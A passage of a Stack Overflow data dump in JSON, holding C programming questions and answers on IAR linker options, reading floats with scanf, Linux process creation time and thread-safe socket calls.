"https://i.stack.imgur.com/IvPNx.png?s=128&g=1", "display_name": "Dmitry Grigoryev", "link": "https://stackoverflow.com/users/4350586/dmitry-grigoryev"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459412597, "post_id": 36313006, "comment_id": 60278212, "body": "@M.M I have added a screenshot to my answer to give you an idea how this is done."}], "answers": [{"comments": [{"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1459413283, "post_id": 36327865, "comment_id": 60278625, "body": "Linker options should have (at least on ARM version) also &quot;Input&quot; tab, which has &quot;Keep symbols&quot; textbox. This should be equivalent of your second option."}, {"owner": {"reputation": 2815, "user_id": 4350586, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/IvPNx.png?s=128&g=1", "display_name": "Dmitry Grigoryev", "link": "https://stackoverflow.com/users/4350586/dmitry-grigoryev"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1459414941, "post_id": 36327865, "comment_id": 60279803, "body": "@user694733 ARM platform has better support in terms of tools. My IDE doesn&#39;t have a &quot;Keep symbols&quot; textbox (or &quot;Input&quot; tab, for that matter). Anyway, unless there is an option to keep ALL the symbols in the output, there&#39;s no practical difference in how to list the symbols I want to keep."}], "tags": [], "owner": {"reputation": 2815, "user_id": 4350586, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/IvPNx.png?s=128&g=1", "display_name": "Dmitry Grigoryev", "link": "https://stackoverflow.com/users/4350586/dmitry-grigoryev"}, "is_accepted": true, "score": 1, "last_activity_date": 1459412469, "creation_date": 1459412469, "answer_id": 36327865, "question_id": 36313006, "link": "https://stackoverflow.com/questions/36313006/how-to-force-iar-linker-to-keep-unused-functions/36327865#36327865", "title": "How to force IAR linker to keep unused functions?", "body": "<p>I have found the relevant <a href=\"https://www.iar.com/support/tech-notes/linker/the-linker-removing-functions-and-variables-or-external-not-found/\" rel=\"nofollow noreferrer\">tech note</a> which suggests the following:</p>\n\n<blockquote>\n  <ul>\n  <li>IAR XLINK Linker -g option</li>\n  <li>IAR ILINK Linker --keep option</li>\n  <li>use the REQUIRE keyword in assembler</li>\n  <li>use the __root extension keyword</li>\n  </ul>\n</blockquote>\n\n<p>Since I use <code>xlink</code>, I tried out the first option and it worked. Here's the option quick reference:</p>\n\n<pre><code>-gsymbol1[,symbol2,symbol3,\u2026] Requires global entries\n</code></pre>\n\n<p>Here's how the option is set in the IDE:\n<a href=\"https://i.stack.imgur.com/zlgRo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zlgRo.png\" alt=\"enter image description here\"></a></p>\n\n<p>And since M.M asked how do I unit test functions which are not called by the rest of the code, here's a screenshot of my debugger. Basically, it stopped the target once the main loop was reached, created an artificial stack frame for a function and called it.\n<a href=\"https://i.stack.imgur.com/F6V5r.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/F6V5r.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 2815, "user_id": 4350586, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/IvPNx.png?s=128&g=1", "display_name": "Dmitry Grigoryev", "link": "https://stackoverflow.com/users/4350586/dmitry-grigoryev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1777, "favorite_count": 0, "accepted_answer_id": 36327865, "answer_count": 1, "score": 0, "last_activity_date": 1459412469, "creation_date": 1459350961, "last_edit_date": 1459409809, "question_id": 36313006, "link": "https://stackoverflow.com/questions/36313006/how-to-force-iar-linker-to-keep-unused-functions", "title": "How to force IAR linker to keep unused functions?", "body": "<p>I'm testing a C software written for Renesas RL78 microcontroller. The software is still in development, so there are functions which are implemented but not yet called. As a result, such functions are eliminated by the linker, which outputs the following entries in the listing:</p>\n\n<pre><code>CODE\n  Segment part 42. NOT NEEDED.\n       LOCAL                   ADDRESS         \n       =====                   =======         \n       function_name\n</code></pre>\n\n<p>My goal is to perform unit tests of these functions on the target system, so I need the code to be present in the output ELF file. How can I tell the linker to keep the unused functions? I already tried to set optimization level to <em>None</em>, and set module type to both <em>Program</em> or <em>Library</em>. I have also defined a single code segment called <code>CODE</code>. All these actions had no desired effect on the linker output.</p>\n\n<p>I can't modify the source code (technically, I can modify all I want, but I can't commit anything), so calling all the functions I need from <code>main()</code> is not an option.</p>\n"}, {"tags": ["c", "floating-point", "double"], "comments": [{"owner": {"reputation": 120111, "user_id": 469935, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/14lYV.jpg?s=128&g=1", "display_name": "Armen Tsirunyan", "link": "https://stackoverflow.com/users/469935/armen-tsirunyan"}, "edited": false, "score": 0, "creation_date": 1459350906, "post_id": 36312900, "comment_id": 60249163, "body": "Well, for one, rate cannot be <i>int</i>, since <i>int</i> is for integer values only. There are floating point types such as <i>float</i> or <i>double</i>. When inputting, you should use <i>%f</i> instead of <i>%d</i> to read floating point values"}], "answers": [{"tags": [], "owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "is_accepted": false, "score": 2, "last_activity_date": 1459353138, "last_edit_date": 1459353138, "creation_date": 1459350945, "answer_id": 36312998, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them/36312998#36312998", "title": "How to read an input of Real Numbers and use them", "body": "<p><code>rate</code> is an integer variable. Change it to <code>float</code>, as well as change the <code>scanf</code> call to</p>\n\n<pre><code>scanf(\"%f\", &amp;rate);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 2, "last_activity_date": 1459353107, "last_edit_date": 1459353107, "creation_date": 1459351138, "answer_id": 36313071, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them/36313071#36313071", "title": "How to read an input of Real Numbers and use them", "body": "<p>When you need a decimal point you have to change your datatype to <code>float</code> or <code>double</code> and when you do that mind that you have to change the format specifier to <code>%f</code> for <code>float</code> and <code>%lf</code> for <code>double</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 42880, "user_id": 982161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/kutcC.png?s=128&g=1", "display_name": "\u03a6Xoc\u0119 \uc6c3 \u041fepe&#250;pa \u30c4", "link": "https://stackoverflow.com/users/982161/%ce%a6xoc%c4%99-%ec%9b%83-%d0%9fepe%c3%bapa-%e3%83%84"}, "is_accepted": true, "score": 3, "last_activity_date": 1459351328, "creation_date": 1459351328, "answer_id": 36313146, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them/36313146#36313146", "title": "How to read an input of Real Numbers and use them", "body": "<p>you are defining all the input variables as Integer. even if you type a double, the system will covert/cast those values to integers...</p>\n\n<p>You are doing this:</p>\n\n<pre><code> int hours_2weeks;\n printf(\"Enter hours worked: \");\n scanf(\"%d\", &amp;hours_2weeks);\n</code></pre>\n\n<p>do instead:</p>\n\n<pre><code>double hours_2weeks;\nprintf(\"Enter hours worked: \");\nscanf(\"%lf\", &amp;hours_2weeks);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 266, "user_id": 3108417, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/QS5Nf.jpg?s=128&g=1", "display_name": "DebashisDeb", "link": "https://stackoverflow.com/users/3108417/debashisdeb"}, "is_accepted": false, "score": 2, "last_activity_date": 1459351378, "creation_date": 1459351378, "answer_id": 36313167, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them/36313167#36313167", "title": "How to read an input of Real Numbers and use them", "body": "<p>You have declared rate as : <code>int rate;</code> , what it does is, the rate variable now can store only Integral values (like 1,4,66,3333, although it has an upper bound) and not Floating Point numbers (like 3.55, 4.2112, 34.533, numbers with decimals).</p>\n\n<p>To be able to store a float value ( numbers with decimals ), you need to delare rate as : <code>float rate;</code> .\nAlso to enable printing of float values to the console output, you need to replace the format specifier of printf and scanf to <code>%f</code> from <code>%d</code></p>\n"}, {"tags": [], "owner": {"reputation": 35, "user_id": 6134911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85dba8cf16b0cb2ab634878ac72cddf1?s=128&d=identicon&r=PG&f=1", "display_name": "Alfredo", "link": "https://stackoverflow.com/users/6134911/alfredo"}, "is_accepted": false, "score": 0, "last_activity_date": 1459352172, "creation_date": 1459352172, "answer_id": 36313496, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them/36313496#36313496", "title": "How to read an input of Real Numbers and use them", "body": "<p>Thanks now it does what I needed it to do.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n\n{\n\nfloat hours_2weeks;\nfloat rate;\nfloat Gross_Pay;\nfloat Social_security_tax;\nfloat Federal_tax;\nfloat State_tax;\nfloat Medical_dental;\nfloat Net_Pay;\n//printf(\"\\nPayroll Program for X Y Z Corp.\\n\");\n{\nprintf(\"Enter hours worked: \");\nscanf(\"%f\", &amp;hours_2weeks);\n\nprintf(\"Enter hourly rate: \");\nscanf(\"%f\", &amp;rate);\n}\nprintf(\"This employee worked %d hours with a salary of $%d per hour. Here is the salary statement for this employee:\\n\",hours_2weeks,rate);\n\nGross_Pay=hours_2weeks*rate;\nprintf(\"Gross Pay: %.2f\\n\", Gross_Pay);\nSocial_security_tax=hours_2weeks*rate*.06;\nprintf(\"Social security tax: -%.2f\\n\", Social_security_tax);\nFederal_tax=hours_2weeks*rate*.1;\nprintf(\"Federal tax: -%.2f\\n\", Federal_tax);\nState_tax=hours_2weeks*rate*.05;\nprintf(\"State tax: -%.2f\\n\", State_tax);\nMedical_dental=hours_2weeks*rate*.05;\nprintf(\"Medical/dental: -%.2f\\n\", Medical_dental);\nNet_Pay=hours_2weeks*rate-(hours_2weeks*rate*.06)-(hours_2weeks*rate*.1)-(hours_2weeks*rate*.05)-(hours_2weeks*rate*.05);\nprintf(\"Net Pay: %.2f\\n\", Net_Pay);\n}\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 6134911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85dba8cf16b0cb2ab634878ac72cddf1?s=128&d=identicon&r=PG&f=1", "display_name": "Alfredo", "link": "https://stackoverflow.com/users/6134911/alfredo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3246, "favorite_count": 0, "accepted_answer_id": 36313146, "answer_count": 5, "score": 1, "last_activity_date": 1459353138, "creation_date": 1459350679, "last_edit_date": 1459351807, "question_id": 36312900, "link": "https://stackoverflow.com/questions/36312900/how-to-read-an-input-of-real-numbers-and-use-them", "title": "How to read an input of Real Numbers and use them", "body": "<p>Hello I have very little experience with coding but the problem that I am working on for school requires me to have an input such as \" 12.5 \" and have that input be processed to give me a certain output.</p>\n\n<p>I am trying to modify this code to do that but with no luck</p>\n\n<p>The code is in C</p>\n\n<p>For example the \"<strong>rate</strong>\" would be something like \"<strong>12.5</strong>\", but it only reads the \"<strong>12</strong>\" and then it continues the calculations with the <strong>12</strong>, and ignores the <strong>.5</strong></p>\n\n<p>I need it to read the whole <strong>12.5</strong></p>\n\n<p>Thanks for any help available. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ()\n{\n    int hours_2weeks;\n    int rate;\n    int Gross_Pay;\n    int Social_security_tax;\n    int Federal_tax;\n    int State_tax;\n    int Medical_dental;\n    int Net_Pay;\n    printf(\"\\nPayroll Program for X Y Z Corp.\\n\");\n    {\n    printf(\"Enter hours worked: \");\n    scanf(\"%d\", &amp;hours_2weeks);\n\n    printf(\"Enter hourly rate: \");\n    scanf(\"%d\", &amp;rate);\n    }\n    printf(\"This employee worked %d hours with a salary of $%d per hour. Here is the salary statement for this employee:\\n\",hours_2weeks,rate);\n\n    Gross_Pay=hours_2weeks*rate;\n    printf(\"Gross Pay: %d\\n\", Gross_Pay);\n    Social_security_tax=hours_2weeks*rate*.06;\n    printf(\"Social security tax: -%d\\n\", Social_security_tax);\n    Federal_tax=hours_2weeks*rate*.1;\n    printf(\"Federal tax: -%d\\n\", Federal_tax);\n    State_tax=hours_2weeks*rate*.05;\n    printf(\"State tax: -%d\\n\", State_tax);\n    Medical_dental=hours_2weeks*rate*.05;\n    printf(\"Medical/dental: -%d\\n\", Medical_dental);\n    Net_Pay=hours_2weeks*rate-(hours_2weeks*rate*.06)-(hours_2weeks*rate*.1)-(hours_2weeks*rate*.05)-(hours_2weeks*rate*.05);\n    printf(\"Net Pay: %d\\n\", Net_Pay);\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "multithreading", "multiprocess"], "comments": [{"owner": {"reputation": 7961, "user_id": 329801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a738a21eabcad64d71d7aeea53d84891?s=128&d=identicon&r=PG", "display_name": "thelaws", "link": "https://stackoverflow.com/users/329801/thelaws"}, "edited": false, "score": 0, "creation_date": 1459350546, "post_id": 36312798, "comment_id": 60248926, "body": "Can you just take the time when the process starts, ex. <a href=\"http://stackoverflow.com/questions/5141960/get-the-current-time-in-c\" title=\"get the current time in c\">stackoverflow.com/questions/5141960/get-the-current-time-in-&zwnj;&#8203;c</a>"}, {"owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "edited": false, "score": 0, "creation_date": 1459350965, "post_id": 36312798, "comment_id": 60249216, "body": "You can use the Linux command <code>ps -p YOUR_PID -o lstart</code> to get the created time."}, {"owner": {"reputation": 43, "user_id": 5711059, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/362befd82eca70d99e43eb15c912395b?s=128&d=identicon&r=PG&f=1", "display_name": "\ubc15\uc8fc\ud604", "link": "https://stackoverflow.com/users/5711059/%eb%b0%95%ec%a3%bc%ed%98%84"}, "edited": false, "score": 0, "creation_date": 1459351138, "post_id": 36312798, "comment_id": 60249347, "body": "thanks, however, I am just wondering whether a STRUCT (is updated by kernel) managing process creation time exists or not."}, {"owner": {"reputation": 623, "user_id": 705886, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/LFwZ5.jpg?s=128&g=1", "display_name": "n0p", "link": "https://stackoverflow.com/users/705886/n0p"}, "edited": false, "score": 0, "creation_date": 1459351594, "post_id": 36312798, "comment_id": 60249733, "body": "This may be helpful, take a look: <a href=\"http://lxr.free-electrons.com/source/include/linux/sched.h\" rel=\"nofollow noreferrer\">lxr.free-electrons.com/source/include/linux/sched.h</a>"}], "owner": {"reputation": 43, "user_id": 5711059, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/362befd82eca70d99e43eb15c912395b?s=128&d=identicon&r=PG&f=1", "display_name": "\ubc15\uc8fc\ud604", "link": "https://stackoverflow.com/users/5711059/%eb%b0%95%ec%a3%bc%ed%98%84"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 242, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459350395, "creation_date": 1459350395, "question_id": 36312798, "link": "https://stackoverflow.com/questions/36312798/process-creation-time-in-linux", "title": "process creation time in linux", "body": "<p>I am making c source file. And I have a question.</p>\n\n<p>Is there a struct that manages process(or thread) creation time?</p>\n\n<p>In this context, creation time is </p>\n\n<blockquote>\n  <p><strong><em>FROM</em></strong> just before creation function is called <strong><em>UNTIL</em></strong> child process(or thread) executes first line</p>\n</blockquote>\n\n<p>thank you.</p>\n"}, {"tags": ["c", "multithreading", "sockets", "posix-api"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1459351084, "post_id": 36312785, "comment_id": 60249304, "body": "How do you plan to use multiple threads? One per connection? A single connection shared between threads? Some other way?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1459351123, "post_id": 36312785, "comment_id": 60249335, "body": "And generally, if the Opengroup reference doesn&#39;t explicitly say something is thread-safe, you should consider it unsafe."}, {"owner": {"reputation": 10390, "user_id": 596370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8571b5b8d990c5ed1220f78cc3b55c49?s=128&d=identicon&r=PG", "display_name": "rashok", "link": "https://stackoverflow.com/users/596370/rashok"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1459351787, "post_id": 36312785, "comment_id": 60249912, "body": "yes, single connection shared between two threads."}, {"owner": {"reputation": 10390, "user_id": 596370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8571b5b8d990c5ed1220f78cc3b55c49?s=128&d=identicon&r=PG", "display_name": "rashok", "link": "https://stackoverflow.com/users/596370/rashok"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1459353705, "post_id": 36312785, "comment_id": 60251397, "body": "reading and writing on two parallel thread, and calling select also on two parallel thread. In 1st thread calling select with readfd and in another thread calling select with same fd on writefd."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1459354701, "post_id": 36312785, "comment_id": 60252044, "body": "@JoachimPileborg, wrong. It is thread-safe to call send/recv on the same socket from multiple threads (though not neccessarily guranteed to produce meaningful results for stream sockets) - still 100% thread safe."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1459363791, "post_id": 36312785, "comment_id": 60257889, "body": "@rajaashok: what you describe (reading from the socket in one thread, writing to the same socket in another thread) is perfectly thread-safe.  A socket has separate buffers for reading and writing."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1459412078, "post_id": 36312785, "comment_id": 60277904, "body": "@JoachimPileborg There are no shared buffers in this code. If you&#39;re referring to the socket send and receive buffers, they&#39;re in the kernel and protected by normal system call atomicity."}], "answers": [{"comments": [{"owner": {"reputation": 10390, "user_id": 596370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8571b5b8d990c5ed1220f78cc3b55c49?s=128&d=identicon&r=PG", "display_name": "rashok", "link": "https://stackoverflow.com/users/596370/rashok"}, "edited": false, "score": 0, "creation_date": 1459416305, "post_id": 36328695, "comment_id": 60280795, "body": "&quot;All functions defined by this volume of POSIX.1-2008 shall be thread-safe&quot; - I think this says non reentrant functions (<code>localtime</code>, <code>gmtime</code> etc) are not thread safe, as it returns static variable address. But its not saying the APIs in <code>sys&#47;socket.h</code> is thread safe even if we call with same fd."}, {"owner": {"reputation": 4505, "user_id": 1168733, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5ewxJ.jpg?s=128&g=1", "display_name": "Sigi", "link": "https://stackoverflow.com/users/1168733/sigi"}, "reply_to_user": {"reputation": 10390, "user_id": 596370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8571b5b8d990c5ed1220f78cc3b55c49?s=128&d=identicon&r=PG", "display_name": "rashok", "link": "https://stackoverflow.com/users/596370/rashok"}, "edited": false, "score": 1, "creation_date": 1459417363, "post_id": 36328695, "comment_id": 60281632, "body": "socket functions are notably thread-safe even if called on the same fd. What&#39;s true is that it&#39;s not recommended to let many threads write/read to/from the same socket because it will lead to unreliable behaviour/unportable code (for example because send()/recv() are not guaranteed to send/recv the amount of data that has been specified - that&#39;s why letting one thread to read, one to write is correct), but all the calls not in the list are requested to be thread-safe to the implementers. socket functions included even if on the same fd."}], "tags": [], "owner": {"reputation": 4505, "user_id": 1168733, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5ewxJ.jpg?s=128&g=1", "display_name": "Sigi", "link": "https://stackoverflow.com/users/1168733/sigi"}, "is_accepted": true, "score": 3, "last_activity_date": 1459416573, "last_edit_date": 1459416573, "creation_date": 1459414708, "answer_id": 36328695, "question_id": 36312785, "link": "https://stackoverflow.com/questions/36312785/are-parallel-calls-to-send-recv-on-the-same-socket-valid-as-per-posix-standard/36328695#36328695", "title": "Are parallel calls to send/recv on the same socket valid as per POSIX standard?", "body": "<p><a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_09_01\" rel=\"nofollow\">Posix functions are thread-safe \"by default\"</a>:</p>\n\n<blockquote>\n  <p><strong>2.9.1 Thread-Safety</strong></p>\n  \n  <p>All functions defined by this volume of POSIX.1-2008 shall be\n  thread-safe, except that the following functions need not be\n  thread-safe.</p>\n</blockquote>\n\n<p>As many have already commented, you can safely call the mentioned calls from different threads.</p>\n\n<p>Case \"1\" and \"2\" are quite typical (one thread receiving, one sending, each thread handling many connections with <code>select()</code>) for production code.</p>\n\n<p>Case \"3\" is somehow odd, and probably source of troubles (it will work, the calls are valid, but it may be not straightforward to get the desired behaviour). Generally you either put the socket in non-blocking mode at the beginning and handle EAGAIN/EWOULDBLOCK errors in <code>send()</code>/<code>recv()</code> calls or blocking and use <code>select()</code>/<code>pselect()</code>/<code>poll()</code>/<code>ppoll()</code>. </p>\n\n<p>The sending thread in this case will randomly \"find\" the socket being in blocking or not-blocking mode: I wouldn't do that.</p>\n"}], "owner": {"reputation": 10390, "user_id": 596370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8571b5b8d990c5ed1220f78cc3b55c49?s=128&d=identicon&r=PG", "display_name": "rashok", "link": "https://stackoverflow.com/users/596370/rashok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2410, "favorite_count": 0, "accepted_answer_id": 36328695, "answer_count": 1, "score": 4, "last_activity_date": 1459416573, "creation_date": 1459350357, "last_edit_date": 1495535489, "question_id": 36312785, "link": "https://stackoverflow.com/questions/36312785/are-parallel-calls-to-send-recv-on-the-same-socket-valid-as-per-posix-standard", "title": "Are parallel calls to send/recv on the same socket valid as per POSIX standard?", "body": "<p>I am trying to understand the usage of socket APIs (<code>recv</code>, <code>send</code>, <code>select</code>, <code>close</code>, etc) on parallel threads. That means using one socket file descriptor on two parallel threads. I have gone through <a href=\"https://stackoverflow.com/questions/1981372/are-parallel-calls-to-send-recv-on-the-same-socket-valid\">this</a> question. But still I am not able to find any standard doc which explains the usage of socket APIs in multiple thread. Even <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/recv.html\" rel=\"nofollow noreferrer\">opengroup</a> man page is not telling anything about this.</p>\n\n<p>I also want to know whether below listed parallel thread usage scenarios are valid in POSIX socket APIs</p>\n\n<p>1) Calling <code>recv</code> and <code>send</code> in two parallel threads</p>\n\n<pre><code>int main_thread() {\n    fd = do_connect(); //TCP or UDP\n    spawn_thread(recv_thread, fd);\n    spwan_thread(send_thread, fd);\n    ...\n}\n\nint recv_thread(fd) {\n    while(1) {\n        recv(fd, ..)\n        ...\n    }\n}\n\nint send_thread(fd) {\n    while(1) {\n        send(fd, ..)\n        ...\n    }\n}\n</code></pre>\n\n<p>2) Calling <code>recv</code> and <code>send</code> with <code>select</code> in two parallel threads</p>\n\n<pre><code>int recv_thread(fd) {\n    while(1) {\n        select(fd in readfd)\n        recv(fd, ..)\n        ...\n    }\n}\n\nint send_thread(fd) {\n    while(1) {\n        select(fd in write)\n        send(fd, ..)\n        ...\n    }\n}\n</code></pre>\n\n<p>3) Calling <code>recv</code> and <code>send</code> with <code>setsockopt</code>, <code>ioctl</code>, <code>fcntl</code> in two paralle threads</p>\n\n<pre><code>int recv_thread(fd) {\n    int flag = 1\n    while(1) {\n        ioctl(fd, FIONBIO, &amp;flag); //enable non block\n        recv(fd, ..)\n        flag = 0;\n        ioctl(fd, FIONBIO, &amp;flag); //disable non block\n        ...\n    }\n}\n\nint send_thread(fd) {\n    while(1) {\n        select(fd in write)\n        send(fd, ..)\n        ...\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "helper"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1459350634, "post_id": 36312766, "comment_id": 60248979, "body": "Unrelated to your problem, but instead of using a big <code>if ... else if ...</code> chain, you might want to look into using the <code>switch</code> statement."}, {"owner": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1459351088, "post_id": 36312766, "comment_id": 60249306, "body": "@JoachimPileborg: Or an array to map <code>ch</code> onto those constants (<code>total += val_map[ch-1]*q</code> and the like)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459526558, "post_id": 36312766, "comment_id": 60341131, "body": "for ease of understanding and readability by us humans: 1) separate code blocks (for, if, else, while, do...while, switch, case, default) via a blank line.  2) follow the axiom: <i>only one statement per line and (at most) one variable declaration per statement.</i>  3) use meaningful variable names.  variable names should indicate content or usage (or better, both)."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459526636, "post_id": 36312766, "comment_id": 60341182, "body": "when calling any of the <code>scanf()</code> family of functions, always check the returned value (not the parameter value) to assure the operation was successful."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": 